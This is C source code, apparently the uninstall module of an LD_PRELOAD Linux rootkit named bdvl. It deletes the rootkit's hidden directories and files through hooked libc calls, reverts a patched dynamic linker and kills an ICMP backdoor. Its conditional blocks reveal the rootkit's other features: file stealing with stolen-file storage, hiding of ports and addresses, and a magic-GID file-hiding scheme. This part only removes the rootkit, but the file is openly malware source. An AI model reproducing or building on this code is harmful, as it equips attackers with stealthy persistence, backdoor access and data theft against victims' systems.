/* recursively removes the target directory. */
void eradicatedir(const char *target){
    DIR *dp;
    struct dirent *dir;
    struct stat pathstat;

    hook(COPENDIR, CREADDIR, CRMDIR, C__XSTAT);

    dp = call(COPENDIR, target);
    if(dp == NULL) return;

    while((dir = call(CREADDIR, dp)) != NULL){
        if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
            continue;

        char path[strlen(target)+strlen(dir->d_name)+2];
        snprintf(path, sizeof(path), "%s/%s", target, dir->d_name);

        memset(&pathstat, 0, sizeof(struct stat));
        if((long)call(C__XSTAT, _STAT_VER, path, &pathstat) != -1)
            if(S_ISDIR(pathstat.st_mode))
                eradicatedir(path); // we recursive.

        if(rm(path) < 0)
            printf("Failed unlink on %s\n", path);
    }
    closedir(dp);
    if((long)call(CRMDIR, target) < 0 && errno != ENOENT && errno != ENOTDIR)
        printf("Failed rmdir on %s\n", target);
}

#ifdef UNINSTALL_MY_ASS
/* read each line in the contents of ASS_PATH.
 * if the line is a hidden path, i.e. one of ours,
 * remove it. if it is a directory, it will be removed recursively
 * by the function eradicatedir. */
void uninstallass(void){
    FILE *fp;
    struct stat assstat, assdirstat;
    gid_t magicgid;

    hook(CFOPEN, C__XSTAT);

    fp = call(CFOPEN, ASS_PATH, "r");

    if(fp != NULL){
        char line[PATH_MAX];
        memset(line, 0, sizeof(line));
        magicgid = readgid();
        while(fgets(line, sizeof(line), fp) != NULL){
            line[strlen(line)-1]='\0';

            memset(&assstat, 0, sizeof(struct stat));
            if((long)call(C__XSTAT, _STAT_VER, line, &assstat) < 0)
                continue;

            if(assstat.st_gid != magicgid)
                continue;

            if(!S_ISDIR(assstat.st_mode))
                rm(line);
            else
                eradicatedir(line);

            char *assdirname = dirname(line);
            if(assdirname == NULL) continue;
            memset(&assdirstat, 0, sizeof(struct stat));

            if((long)call(C__XSTAT, _STAT_VER, assdirname, &assdirstat) < 0)
                continue;

            if(assdirstat.st_gid == magicgid && S_ISDIR(assdirstat.st_mode))
                eradicatedir(assdirname);
        }

        fclose(fp);
    }
    rm(ASS_PATH);
}
#endif



void rmbdvpaths(void){
    char *src, *dest;
    int ulr;

    for(int i = 0; i < LINKSRCS_SIZE; i++){
        src = linksrcs[i];
        dest = linkdest(i);
        if(!dest) continue;

        ulr = rm(src);
        if(ulr < 0 && errno == EISDIR)
            eradicatedir(src);
        else if(ulr < 0)
            printf("Failed removing %s (%s)\n", src, basename(dest));
        free(dest);
    }

    for(int i=0; i < BDVPATHS_SIZE; i++){
        src = bdvpaths[i];
        if(src[strlen(src)-1]=='/'){
            eradicatedir(src);
            continue;
        }

        if(rm(src) < 0) printf("Failed removing %s\n", src);
    }

#ifdef UNINSTALL_MY_ASS
    printf("Uninstalling your ass\n");
    uninstallass();
#endif
    char *preloadpath = OLD_PRELOAD;
#ifdef PATCH_DYNAMIC_LINKER
    preloadpath = PRELOAD_FILE;
#endif
    printf("Removing preload file\n");
    doiapath(preloadpath, 0);
    if(rm(preloadpath) < 0)
        printf("Failed removing preload file\n");

#if defined FILE_STEAL && defined FILE_CLEANSE_TIMER
    if(rm(CLEANEDTIME_PATH) < 0)
        printf("Failed removing CLEANEDTIME_PATH\n");
#endif
#ifdef HIDE_PORTS
    if(rm(HIDEPORTS) < 0)
        printf("Failed removing hide_ports\n");
#endif
#ifdef HIDE_ADDRS
    if(rm(HIDEADDRS) < 0)
        printf("Failed removing hide_addrs\n");
#endif
#ifdef STOLEN_STORAGE
    if(rm(STOLESTORE_PATH) < 0)
        printf("Failed removing STOLESTORE_PATH\n");
#endif
}




void uninstallbdv(void){
    dorolf();

#ifdef USE_ICMP_BD
    if(pdoorup()){
        printf("Killing ICMP backdoor\n");
        killrkprocs(readgid()-1);
    }
#endif

#ifdef PATCH_DYNAMIC_LINKER
    printf("Reverting ld.so\n");
    ldpatch(PRELOAD_FILE, OLD_PRELOAD);
#endif

    printf("Eradicating directories\n");
    eradicatedir(INSTALL_DIR);
    eradicatedir(HOMEDIR);

    printf("Removing bdvl paths\n");
    rmbdvpaths();

    printf("Done.\n");
}